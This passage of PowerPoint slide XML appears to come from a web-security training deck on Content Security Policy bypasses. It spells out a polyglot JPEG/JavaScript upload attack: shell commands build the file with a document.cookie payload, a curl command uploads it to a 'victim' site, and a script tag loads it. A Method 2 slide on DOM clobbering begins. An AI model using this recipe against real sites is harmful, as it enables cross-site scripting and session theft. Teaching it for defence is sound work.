          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Method 1: Polyglot File Upload</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2805232" y="1864519"/>
            <a:ext cx="9019818" cy="164783"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Concept:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Create a file that is both valid JavaScript AND valid image/PDF/etc.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2805232" y="4439841"/>
            <a:ext cx="9019818" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 128664"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9D4C9"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5028962" y="4047768"/>
            <a:ext cx="15240" cy="392073"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 128664"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9D4C9"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4889540" y="4292798"/>
            <a:ext cx="294084" cy="294084"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6668"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4938593" y="4317325"/>
            <a:ext cx="195977" cy="245031"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">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1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4014430" y="2113955"/>
            <a:ext cx="2044303" cy="204192"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 1: Create polyglot file</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2935843" y="2402800"/>
            <a:ext cx="4201597" cy="1514237"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1295"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2929414" y="2402800"/>
            <a:ext cx="4214455" cy="1514237"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1295"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3060025" y="2500789"/>
            <a:ext cx="3953232" cy="1318260"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Create valid JPEG with embedded JavaScript</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printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' &gt; polyglot.jpg</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echo '/*' &gt;&gt; polyglot.jpg</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cat image.jpg &gt;&gt; polyglot.jpg</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echo '*/' &gt;&gt; polyglot.jpg</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echo 'alert(document.cookie);' &gt;&gt; polyglot.jpg</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7307461" y="4439841"/>
            <a:ext cx="15240" cy="392073"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 128664"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9D4C9"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7168039" y="4292798"/>
            <a:ext cx="294084" cy="294084"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6668"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7217093" y="4317325"/>
            <a:ext cx="195977" cy="245031"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">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2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6214705" y="4962644"/>
            <a:ext cx="2200751" cy="204192"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 2: Upload to victim site</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5214223" y="5251490"/>
            <a:ext cx="4201716" cy="690324"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2840"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5207794" y="5251490"/>
            <a:ext cx="4214574" cy="690324"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2840"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5338405" y="5349478"/>
            <a:ext cx="3953351" cy="494348"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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curl -X POST https://victim.com/upload \</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-F "file=@polyglot.jpg" \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>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  -b cookies.txt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9585960" y="4047768"/>
            <a:ext cx="15240" cy="392073"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 128664"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9D4C9"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9446538" y="4292798"/>
            <a:ext cx="294084" cy="294084"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6668"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9495592" y="4317325"/>
            <a:ext cx="195977" cy="245031"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8660963" y="2113955"/>
            <a:ext cx="1865114" cy="204192"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 3: Include as script</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7492722" y="2402800"/>
            <a:ext cx="4201716" cy="360759"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5435"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7486293" y="2402800"/>
            <a:ext cx="4214574" cy="360759"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5435"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7616904" y="2500789"/>
            <a:ext cx="3953351" cy="164783"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2EFE8"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>&lt;script src="/uploads/polyglot.jpg"&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2805232" y="6026468"/>
            <a:ext cx="9019818" cy="1216938"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1611"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C9DDE9"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="28" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2935843" y="6143744"/>
            <a:ext cx="204192" cy="163354"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3270647" y="6134338"/>
            <a:ext cx="1634014" cy="204192"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3270647" y="6413778"/>
            <a:ext cx="8423791" cy="659389"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>File passes image validation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Hosted on trusted domain ('self')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Browser executes as JavaScript</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1250"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CSP allows scripts from 'self'</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Method 2: DOM Clobbering + CSP Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4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2102" y="1330643"/>
            <a:ext cx="7899797" cy="1111091"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Method 2: DOM Clobbering + CSP Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="622102" y="2789992"/>
            <a:ext cx="2666524" cy="333375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable Code:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="622102" y="3280053"/>
            <a:ext cx="3733086" cy="1534477"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1738"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="613291" y="3280053"/>
            <a:ext cx="3750707" cy="1534477"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
